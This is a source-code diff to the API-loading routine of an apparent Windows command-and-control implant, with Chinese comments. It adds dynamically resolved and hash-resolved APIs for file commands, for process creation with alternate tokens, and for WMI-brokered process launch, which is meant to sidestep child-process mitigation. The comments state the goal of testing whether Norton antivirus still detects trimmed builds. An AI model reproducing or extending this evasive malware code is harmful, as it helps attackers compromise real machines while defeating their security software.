@@ -281,14 +281,20 @@ BOOL ApiLoad()
 	//
 	// 当前你的最小化/Norton 定位构建一般打开 DIRECT_HTTPS_CHECKIN_ONLY，
 	// 所以这块通常会被编译器排除，不进入当前测试样本。
-#if !DIRECT_HTTPS_CHECKIN_ONLY
+#if !DIRECT_HTTPS_CHECKIN_ONLY || DIRECT_HTTPS_FILE_COMMANDS_ONLY
 	ApiWin->CopyFileA                 = (decltype(CopyFileA)*)                 ResolveByName(hKernel32Module, "CopyFileA");
 	ApiWin->CreateDirectoryA          = (decltype(CreateDirectoryA)*)          ResolveByName(hKernel32Module, "CreateDirectoryA");
 	ApiWin->CreateFileA               = (decltype(CreateFileA)*)               ResolveByName(hKernel32Module, "CreateFileA");
 	ApiWin->CreatePipe                = (decltype(CreatePipe)*)                ResolveByName(hKernel32Module, "CreatePipe");
 	ApiWin->CreateProcessA            = (decltype(CreateProcessA)*)            ResolveByName(hKernel32Module, "CreateProcessA");
+	ApiWin->OpenProcess               = (decltype(OpenProcess)*)               ResolveByName(hKernel32Module, "OpenProcess");
+	ApiWin->SetHandleInformation      = (decltype(SetHandleInformation)*)      ResolveByName(hKernel32Module, "SetHandleInformation");
+	ApiWin->InitializeProcThreadAttributeList = (decltype(InitializeProcThreadAttributeList)*) ResolveByName(hKernel32Module, "InitializeProcThreadAttributeList");
+	ApiWin->UpdateProcThreadAttribute = (decltype(UpdateProcThreadAttribute)*) ResolveByName(hKernel32Module, "UpdateProcThreadAttribute");
+	ApiWin->DeleteProcThreadAttributeList = (decltype(DeleteProcThreadAttributeList)*) ResolveByName(hKernel32Module, "DeleteProcThreadAttributeList");
 	ApiWin->DeleteFileA               = (decltype(DeleteFileA)*)               ResolveByName(hKernel32Module, "DeleteFileA");
 	ApiWin->GetExitCodeProcess        = (decltype(GetExitCodeProcess)*)        ResolveByName(hKernel32Module, "GetExitCodeProcess");
+	ApiWin->GetProcessId              = (decltype(GetProcessId)*)              ResolveByName(hKernel32Module, "GetProcessId");
 	ApiWin->FindClose                 = (decltype(FindClose)*)                 ResolveByName(hKernel32Module, "FindClose");
 	ApiWin->FindFirstFileA            = (decltype(FindFirstFileA)*)            ResolveByName(hKernel32Module, "FindFirstFileA");
 	ApiWin->FindNextFileA             = (decltype(FindNextFileA)*)             ResolveByName(hKernel32Module, "FindNextFileA");
@@ -298,6 +304,7 @@ BOOL ApiLoad()
 	ApiWin->GetFileAttributesA        = (decltype(GetFileAttributesA)*)        ResolveByName(hKernel32Module, "GetFileAttributesA");
 	ApiWin->GetFullPathNameA          = (decltype(GetFullPathNameA)*)          ResolveByName(hKernel32Module, "GetFullPathNameA");
 	ApiWin->GetLogicalDrives          = (decltype(GetLogicalDrives)*)          ResolveByName(hKernel32Module, "GetLogicalDrives");
+	ApiWin->WideCharToMultiByte       = (decltype(WideCharToMultiByte)*)       ResolveByName(hKernel32Module, "WideCharToMultiByte");
 	ApiWin->MoveFileA                 = (decltype(MoveFileA)*)                 ResolveByName(hKernel32Module, "MoveFileA");
 	ApiWin->PeekNamedPipe             = (decltype(PeekNamedPipe)*)             ResolveByName(hKernel32Module, "PeekNamedPipe");
 	ApiWin->ReadFile                  = (decltype(ReadFile)*)                  ResolveByName(hKernel32Module, "ReadFile");
@@ -349,12 +356,10 @@ BOOL ApiLoad()
 #endif
 
 #if DIRECT_HTTPS_SKIP_UNUSED_API_INIT
-	// “未用 API 不初始化”实验模式：
-	// 当前 minimal/check-in-only 样本不使用 ntdll 表里的退出函数。
-	// AgentExit() 在这个模式下改成自然返回，因此这里完全跳过：
-	// - ModuleByName("ntdll.dll")
-	// - ResolveByName("RtlExitUserThread")
-	// - ResolveByName("RtlExitUserProcess")
+		// “未用 API 不初始化”实验模式：
+		// 当前 minimal/check-in-only 样本不使用 ntdll 表里的退出函数。
+		// AgentExit() 在这个模式下改成自然返回，因此普通 hello 样本完全跳过 ntdll。
+		// file-only 样本的 CmdCat 需要 NtClose 释放文件句柄，所以只解析这一项。
 	//
 	// 这正好验证老师建议的方向：把暂时不用的初始化面收掉，
 	// 看 Norton 是否还会在 ApiLoad() 末端或 ntdll/Rtl 解析附近拦截。
@@ -363,16 +368,35 @@ BOOL ApiLoad()
 	return TRUE;
 #endif
 #if DIRECT_HTTPS_PROBE_STAGE == 78
-	ApiLoadProbeCode = 1378;
-	return TRUE;
+		ApiLoadProbeCode = 1378;
+		return TRUE;
 #endif
-	return ApiWin->GetTickCount &&
-	       ApiWin->HeapAlloc &&
-	       ApiWin->HeapCreate &&
-	       ApiWin->HeapDestroy &&
-	       ApiWin->HeapFree &&
-	       ApiWin->Sleep;
-#else
+	#if DIRECT_HTTPS_FILE_COMMANDS_ONLY
+		HMODULE hNtdllModule = LoadLibraryA("ntdll.dll");
+		SysModules->Ntdll = hNtdllModule;
+		if (!hNtdllModule)
+			return FALSE;
+		ApiNt->NtClose = (decltype(NtClose)*)ResolveByName(hNtdllModule, "NtClose");
+		ApiNt->RtlCreateProcessParameters = (decltype(RtlCreateProcessParameters)*)ResolveByName(hNtdllModule, "RtlCreateProcessParameters");
+		ApiNt->RtlDestroyProcessParameters = (decltype(RtlDestroyProcessParameters)*)ResolveByName(hNtdllModule, "RtlDestroyProcessParameters");
+		ApiNt->RtlCreateUserProcess = (decltype(RtlCreateUserProcess)*)ResolveByName(hNtdllModule, "RtlCreateUserProcess");
+		ApiNt->NtCreateUserProcess = (decltype(NtCreateUserProcess)*)ResolveByName(hNtdllModule, "NtCreateUserProcess");
+		return ApiWin->GetTickCount &&
+		       ApiWin->HeapAlloc &&
+		       ApiWin->HeapCreate &&
+		       ApiWin->HeapDestroy &&
+		       ApiWin->HeapFree &&
+		       ApiWin->Sleep &&
+		       ApiNt->NtClose;
+	#else
+		return ApiWin->GetTickCount &&
+		       ApiWin->HeapAlloc &&
+		       ApiWin->HeapCreate &&
+		       ApiWin->HeapDestroy &&
+		       ApiWin->HeapFree &&
+		       ApiWin->Sleep;
+	#endif
+	#else
 	// 第七步：找到 ntdll.dll。
 	// ntdll.dll 提供更底层的 NTAPI / RTL API。
 	HMODULE hNtdllModule = ModuleByName("ntdll.dll");
@@ -466,6 +490,33 @@ BOOL ApiLoad()
 	if (hAdvapi32Module) {
 		ApiWin->GetTokenInformation = (decltype(GetTokenInformation)*) ResolveByName(hAdvapi32Module, "GetTokenInformation");
 		ApiWin->GetUserNameA        = (decltype(GetUserNameA)*)        ResolveByName(hAdvapi32Module, "GetUserNameA");
+		ApiWin->CreateProcessAsUserA = (decltype(CreateProcessAsUserA)*) ResolveByName(hAdvapi32Module, "CreateProcessAsUserA");
+		ApiWin->CreateProcessWithTokenW = (decltype(CreateProcessWithTokenW)*) ResolveByName(hAdvapi32Module, "CreateProcessWithTokenW");
+	}
+	HMODULE hShell32Module = ModuleByName("shell32.dll");
+	SysModules->Shell32 = hShell32Module;
+	if (hShell32Module)
+		ApiWin->ShellExecuteExA = (decltype(ShellExecuteExA)*) ResolveByName(hShell32Module, "ShellExecuteExA");
+
+	// WPP/WPS main hosts may enable the child-process mitigation policy. WMI
+	// exposes a brokered Win32_Process.Create operation that preserves the
+	// command job/output contract without making the agent process a parent.
+	HMODULE hOle32Module = ModuleByName("ole32.dll");
+	SysModules->Ole32 = hOle32Module;
+	if (hOle32Module) {
+		ApiWin->CoInitializeEx       = (decltype(CoInitializeEx)*)       ResolveByName(hOle32Module, "CoInitializeEx");
+		ApiWin->CoInitializeSecurity = (decltype(CoInitializeSecurity)*) ResolveByName(hOle32Module, "CoInitializeSecurity");
+		ApiWin->CoCreateInstance     = (decltype(CoCreateInstance)*)     ResolveByName(hOle32Module, "CoCreateInstance");
+		ApiWin->CoSetProxyBlanket    = (decltype(CoSetProxyBlanket)*)    ResolveByName(hOle32Module, "CoSetProxyBlanket");
+		ApiWin->CoUninitialize       = (decltype(CoUninitialize)*)       ResolveByName(hOle32Module, "CoUninitialize");
+	}
+	HMODULE hOleAut32Module = ModuleByName("oleaut32.dll");
+	SysModules->OleAut32 = hOleAut32Module;
+	if (hOleAut32Module) {
+		ApiWin->SysAllocString = (decltype(SysAllocString)*) ResolveByName(hOleAut32Module, "SysAllocString");
+		ApiWin->SysFreeString  = (decltype(SysFreeString)*)  ResolveByName(hOleAut32Module, "SysFreeString");
+		ApiWin->VariantInit    = (decltype(VariantInit)*)    ResolveByName(hOleAut32Module, "VariantInit");
+		ApiWin->VariantClear   = (decltype(VariantClear)*)   ResolveByName(hOleAut32Module, "VariantClear");
 	}
 
 	// ntdll.dll：解析底层 NTAPI / RTL API。
@@ -489,6 +540,10 @@ BOOL ApiLoad()
 	ApiNt->NtOpenProcessToken       = (decltype(NtOpenProcessToken)*)       ResolveByName(hNtdllModule, "NtOpenProcessToken");
 	ApiNt->NtTerminateProcess       = (decltype(NtTerminateProcess)*)       ResolveByName(hNtdllModule, "NtTerminateProcess");
 	ApiNt->RtlGetVersion            = (decltype(RtlGetVersion)*)            ResolveByName(hNtdllModule, "RtlGetVersion");
+	ApiNt->RtlCreateProcessParameters = (decltype(RtlCreateProcessParameters)*) ResolveByName(hNtdllModule, "RtlCreateProcessParameters");
+	ApiNt->RtlDestroyProcessParameters = (decltype(RtlDestroyProcessParameters)*) ResolveByName(hNtdllModule, "RtlDestroyProcessParameters");
+	ApiNt->RtlCreateUserProcess     = (decltype(RtlCreateUserProcess)*)     ResolveByName(hNtdllModule, "RtlCreateUserProcess");
+	ApiNt->NtCreateUserProcess      = (decltype(NtCreateUserProcess)*)      ResolveByName(hNtdllModule, "NtCreateUserProcess");
 	ApiNt->RtlExitUserThread        = (decltype(RtlExitUserThread)*)        ResolveByName(hNtdllModule, "RtlExitUserThread");
 	ApiNt->RtlExitUserProcess       = (decltype(RtlExitUserProcess)*)       ResolveByName(hNtdllModule, "RtlExitUserProcess");
 	ApiNt->RtlIpv4StringToAddressA  = (decltype(RtlIpv4StringToAddressA)*)  ResolveByName(hNtdllModule, "RtlIpv4StringToAddressA");
@@ -555,7 +610,7 @@ BOOL ApiLoad()
 		ApiWin->LoadLibraryA = (decltype(LoadLibraryA)*)GetSymbolAddress(hKernel32Module, HASH_FUNC_LOADLIBRARYA);
 
 		// 非 check-in-only 模式才需要文件、目录、子进程相关 API。
-#if !DIRECT_HTTPS_CHECKIN_ONLY
+#if !DIRECT_HTTPS_CHECKIN_ONLY || DIRECT_HTTPS_FILE_COMMANDS_ONLY
 		ApiWin->CopyFileA				= (decltype(CopyFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_COPYFILEA);
 		ApiWin->CreateDirectoryA		= (decltype(CreateDirectoryA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEDIRECTORYA);
 		ApiWin->CreateFileA				= (decltype(CreateFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEFILEA);
@@ -570,7 +625,7 @@ BOOL ApiLoad()
 		// 身份采集/基础运行 API。
 		ApiWin->GetACP					= (decltype(GetACP)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETACP);
 		ApiWin->GetComputerNameExA		= (decltype(GetComputerNameExA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETCOMPUTERNAMEEXA);
-#if !DIRECT_HTTPS_CHECKIN_ONLY
+#if !DIRECT_HTTPS_CHECKIN_ONLY || DIRECT_HTTPS_FILE_COMMANDS_ONLY
 		ApiWin->GetCurrentDirectoryA	= (decltype(GetCurrentDirectoryA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETCURRENTDIRECTORYA);
 		ApiWin->GetDriveTypeA			= (decltype(GetDriveTypeA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETDRIVETYPEA);
 		ApiWin->GetFileSize				= (decltype(GetFileSize)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFILESIZE);
@@ -578,7 +633,7 @@ BOOL ApiLoad()
 		ApiWin->GetFullPathNameA		= (decltype(GetFullPathNameA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFULLPATHNAMEA);
 #endif
 		ApiWin->GetLastError			= (decltype(GetLastError)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLASTERROR);
-#if !DIRECT_HTTPS_CHECKIN_ONLY
+#if !DIRECT_HTTPS_CHECKIN_ONLY || DIRECT_HTTPS_FILE_COMMANDS_ONLY
 		ApiWin->GetLogicalDrives		= (decltype(GetLogicalDrives)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLOGICALDRIVES);
 #endif
 		ApiWin->GetOEMCP				= (decltype(GetOEMCP)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETOEMCP);
@@ -598,7 +653,7 @@ BOOL ApiLoad()
 		ApiWin->LocalAlloc				= allocProc;
 		ApiWin->LocalFree				= (decltype(LocalFree)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALFREE);
 		ApiWin->LocalReAlloc			= (decltype(LocalReAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALREALLOC);
-#if !DIRECT_HTTPS_CHECKIN_ONLY
+#if !DIRECT_HTTPS_CHECKIN_ONLY || DIRECT_HTTPS_FILE_COMMANDS_ONLY
 		ApiWin->MoveFileA				= (decltype(MoveFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_MOVEFILEA);
 		ApiWin->PeekNamedPipe			= (decltype(PeekNamedPipe)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_PEEKNAMEDPIPE);
 		ApiWin->ReadFile                = (decltype(ReadFile)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_READFILE);
@@ -606,7 +661,7 @@ BOOL ApiLoad()
 		ApiWin->SetCurrentDirectoryA    = (decltype(SetCurrentDirectoryA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_SETCURRENTDIRECTORYA);
 #endif
 		ApiWin->Sleep					= (decltype(Sleep)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_SLEEP);
-#if !DIRECT_HTTPS_CHECKIN_ONLY
+#if !DIRECT_HTTPS_CHECKIN_ONLY || DIRECT_HTTPS_FILE_COMMANDS_ONLY
 		ApiWin->WriteFile				= (decltype(WriteFile)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_WRITEFILE);
 #endif
 
